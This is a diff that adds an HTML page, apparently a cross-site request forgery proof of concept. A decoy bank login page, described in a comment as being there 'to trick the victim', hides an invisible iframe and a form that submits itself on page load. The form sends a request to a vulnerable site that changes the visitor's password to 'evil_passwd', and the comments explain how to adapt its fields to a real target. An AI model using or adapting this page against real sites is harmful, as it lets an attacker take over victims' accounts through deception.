@@ -1,0 +1,28 @@
+<html>
+    <head>
+        <title>Bank Login Page</title>
+    </head>
+    <body>
+      <!-- Fake Page, can be anything else this is just to trick the victim -->
+        <div align="center">
+            <h1>Bank Login Page</h1>
+            <form>
+                <input type="text" name="username" value="" placeholder="Username"><br />
+                <input type="password" name="password" value="" placeholder="Password"><br />
+                <input type="submit" value="Login" />
+            </form>
+        </div>
+        <!-- Form target frame to avoid redirection -->
+        <iframe id="iframe" name="my_iframe" style="position: absolute;width:0;height:0;border:0;"></iframe>
+        <!-- CSRF - Update Password -->
+        <form name="csrf" id="csrf" target="my_iframe" action="http://vulnerablewebsite.com/csrf_param.php" method="GET">
+            <input type="hidden" name="password_new" value="evil_passwd"> <!-- attribute name= modifiy according to the form present on the fulnerable website as that will be grabbed by javascript, attribue value= is holding the new password -->
+            <input type="hidden" name="password_conf" value="evil_passwd"> <!-- attribute name= modifiy according to the form present on the fulnerable website as that will be grabbed by javascript attribue value= is holding the new password -->
+            <input type="hidden" name="action" value="change"> <!-- attribute name= modifiy according to the form present on the fulnerable website as that will be grabbed by javascript, value= attribute should be changed according to the name/value of the button on vulnerable website --> 
+        </form>
+        <!-- Submit form -->
+        <script>
+            document.csrf.submit();
+        </script>
+    </body>
+</html>
